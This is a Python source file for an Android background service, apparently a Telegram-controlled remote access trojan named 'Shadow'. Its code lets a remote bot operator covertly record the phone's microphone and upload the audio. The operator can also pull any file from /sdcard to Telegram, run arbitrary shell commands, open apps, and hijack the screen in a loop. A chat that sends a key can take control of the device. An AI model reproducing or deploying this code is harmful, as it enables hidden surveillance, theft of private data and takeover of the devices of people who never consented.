import time,subprocess,requests,os,platform,threading,json
from jnius import autoclass

def send_message(message):
    try:
        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id':root_user,'text':message,'parse_mode':'Markdown'})
        return {'ok':True,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def send_photo(path,caption):
    try:
        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data={'chat_id':root_user,'caption':caption},files={'photo':open(path,'rb')})
        return {'ok':True,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def send_video(path,caption):
    try:
        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVideo', data={'chat_id':root_user,'caption':caption},files={'video':open(path,'rb')})
        return {'ok':True,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def send_audio(path,caption):
    try:
        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendAudio', data={'chat_id':root_user,'caption':caption},files={'audio':open(path,'rb')})
        return {'ok':True,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def send_voice(path,caption):
    try:
        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVoice', data={'chat_id':root_user,'caption':caption},files={'voice':open(path,'rb')})
        return {'ok':True,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def send_document(path,caption):
    try:
        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id':root_user,'caption':caption},files={'document':open(path,'rb')})
        return {'ok':True,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def get_update(offset):
    try:
        result = requests.get(f'https://api.telegram.org/bot{bot_token}/getUpdates',params={'offset':offset} if offset else {},timeout=5).json()
        if not result['ok']: return {'ok':False,'result':result['description']}
        if not result['result']: return {'ok':False,'result':result['result']}
        return {'ok':True,'result':result['result'][-1]}
    except Exception as error: return {'ok':False,'result':error}

def internet():
    try:
        result = requests.get('https://www.google.com',timeout=3)
        return {'ok':result.status_code == 200,'result':result.status_code}
    except Exception as error: return {'ok':False,'result':error}

def start_recording(sec):
    try:
        time.sleep(2)
        MediaRecorder = autoclass('android.media.MediaRecorder')
        AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
        context = autoclass('android.app.ActivityThread').currentApplication().getApplicationContext()
        save_dir = context.getExternalFilesDir(None).getAbsolutePath()
        file_path = os.path.join(save_dir, "jarvis_record.m4a")
        recorder = MediaRecorder()
        recorder.setAudioSource(AudioSource.VOICE_RECOGNITION)
        recorder.setOutputFormat(OutputFormat.MPEG_4)
        recorder.setAudioEncoder(AudioEncoder.AAC)
        recorder.setOutputFile(file_path)
        send_message('Preparing Mic...')
        recorder.prepare()
        recorder.start()
        send_message(f'Listening `{sec}`s...')
        time.sleep(sec)
        recorder.stop()
        recorder.release()
        send_document(file_path, 'Recording Saved Successfully')
    except Exception as error: send_message(f'Mic Problem: `{error}`')

def go_home():
    try:
        time.sleep(2)
        Intent = autoclass('android.content.Intent')
        context = autoclass('android.app.ActivityThread').currentApplication().getApplicationContext()
        intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        send_message('Back 2 Home.')
    except Exception as error: send_message(f'B2H Error: {error}')

def open_app(package_name):
    try:
        time.sleep(2)
        context = autoclass('android.app.ActivityThread').currentApplication().getApplicationContext()
        pm = context.getPackageManager()
        intent = pm.getLaunchIntentForPackage(package_name)
        if intent is not None:
            send_message(f'Opening `{package_name}`...')
            context.startActivity(intent)
            send_message(f'App Opened.')
        else: send_message(f'App `{package_name}` Not Found In Phone!')
    except Exception as error: send_message(f'Opening Error: `{error}`')

def loop(process,end):
    try:
        time.sleep(2)
        if end < 60:
            send_message(f'Menimum End Value Must Be `60`s')
            return
        end_value = time.time()+end
        if process == 'gohome':
            send_message(f'`{process}` Loop Started, Ending Time: `{end}`s')
            while time.time() <= end_value:
                go_home()
                time.sleep(5)
            send_message(f'`{process}` Loop Finished')
        else: send_message('Invalid Option For `loop`')
    except Exception as error: send_message(f'Looping Error: `{error}`')

def gen_response(cmd):
    try:
        parts = cmd.strip().split()
        if not parts: return f'Command Not Given: `{cmd}`'
        cmdlen = len(parts)
        main = parts[0]
        if cmdlen == 1 and main.lower() == 'active': return f'`{device}` is active'
        elif cmdlen == 1 and main.lower() == 'sysinfo': return f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`'
        elif cmdlen == 1 and main.lower() == 'count': return f'*Shadow Total Running Count On* `{device}`: `{count}`'
        elif cmdlen == 1 and main.lower() == 'uiargv': return f'*UI Argv:* `{os.environ.get("PYTHON_SERVICE_ARGUMENT","No Argvs")}`'
        elif cmdlen == 3 and main.lower() == 'loop':
            threading.Thread(target=loop,args=(parts[1],int(parts[2]),),daemon=True).start()
            return f'`{main}` Requests Sended'
        elif cmdlen == 2 and main.lower() == 'record':
            threading.Thread(target=start_recording,args=(int(parts[1]),),daemon=True).start()
            return f'`{main}` Requests Sended'
        elif cmdlen == 1 and main.lower() == 'gohome':
            threading.Thread(target=go_home,daemon=True).start()
            return f'`{main}` Requests Sended'
        elif cmdlen == 2 and main.lower() == 'app':
            threading.Thread(target=open_app,args=(parts[1],),daemon=True).start()
            return f'`{main}` Requests Sended'
        elif cmdlen == 3 and main.lower() == 'send':
            path = f'/sdcard/{parts[2]}'
            if not os.path.exists(path): return f'Path Not Found `{path}`'
            file_details = subprocess.getoutput(f'stat {path}')
            if parts[1] == 'photo':
                send_photo(path,file_details)
                return f'`{parts[1]}` Requests Sended'
            elif parts[1] == 'video':
                send_video(path,file_details)
                return f'`{parts[1]}` Requests Sended'
            elif parts[1] == 'audio':
                send_audio(path,file_details)
                return f'`{parts[1]}` Requests Sended'
            elif parts[1] == 'voice':
                send_voice(path,file_details)
                return f'`{parts[1]}` Requests Sended'
            elif parts[1] == 'document':
                send_document(path,file_details)
                return f'`{parts[1]}` Requests Sended'
            else: return f'Invalid Option For `{main}`'
        elif cmdlen > 1 and main == ':':
            send_message(f'Executing Shell Command(`{" ".join(parts[1:])}`)...')
            result = subprocess.run(parts[1:],capture_output=True,text=True,timeout=5)
            if result.stderr: return f'```Executing(err)\n{result.stderr}```'
            if result.stdout: return f'```Executing(res)\n{result.stdout}```'
            return '```Executing(res)\nExecuted```'
        else: return f'Invalid `{cmd}`'
    except Exception as error: return f'*Error:* `{error}`'

count = 0
seen_id = []
offset = None
root_user = json.load(open('settings.json'))['root_id']
bot_token = json.load(open('settings.json'))['bot_token']
root_key = os.environ.get('PYTHON_SERVICE_ARGUMENT','unknown:00xx')
device = subprocess.getoutput("getprop ro.product.brand").strip().lower().split()[0]

print('* root_key:',root_key,'\n* root_user:',root_user,'\n* shadow`s running....')

while True:
    try:
        if not internet()['ok']:
            print('* waiting for connection...')
            while True:
                result = internet()['ok']
                if result:
                    if root_user: send_message(f'`{device}` back to connection')
                    break
                time.sleep(0.5)
            print('* connected')
        new_update = get_update(offset)
        if not new_update['ok']:
            print('* get update:',new_update['result'])
            time.sleep(0.5)
            continue
        update = new_update['result']
        update_id = update['update_id']
        offset = update_id+1
        if count == 0:
            seen_id.append(update_id)
            time.sleep(0.5)
            count += 1
            continue
        chat_id = update['message']['chat']['id']
        try:
            message = update['message']['text']
        except KeyError:
            print('* unknown text formate recived:',chat_id)
            seen_id.append(update_id)
            time.sleep(0.5)
            count += 1
            continue
        temp_cmd = message.strip().lower().split()
        if len(temp_cmd) == 2 and temp_cmd[0] == 'connect' and temp_cmd[1] == root_key:
            if root_user: send_message(f'You Are Disconnected 2 `{device}`\nNew User Takeover 2 `{device}`\nNew User: `{chat_id}`')
            with open('settings.json','w') as f: json.dump({'root_id':chat_id,'bot_token':bot_token},f)
            root_user = chat_id
            print('* new user takeover 2 system:',chat_id)
            send_message(f'`{device}` Connected 2 Bot.')
            seen_id.append(update_id)
            time.sleep(0.5)
            count += 1
            continue
        if chat_id != root_user:
            seen_id.append(update_id)
            time.sleep(0.5)
            count += 1
            continue
        if len(temp_cmd) == 2 and temp_cmd[0] == 'disconnect' and temp_cmd[1] == device.strip().lower():
            with open('root_user.json','w') as f: json.dump({'root_id':None,'bot_token':bot_token},f)
            send_message(f'Now You Are Disconnected 2 `{device}`')
            print(f'* current user disconnected 2 system')
            seen_id.append(update_id)
            root_user = None
            time.sleep(0.5)
            count += 1
            continue
        response = gen_response(message) # conform ivan root user dhan so reponse gen pandom.
        print('* message send:',send_message(response))
        seen_id.append(update_id)
        time.sleep(0.5)
        count += 1
        continue
    except Exception as error:
        print('* main eror:',error)
        time.sleep(0.5)
        continue
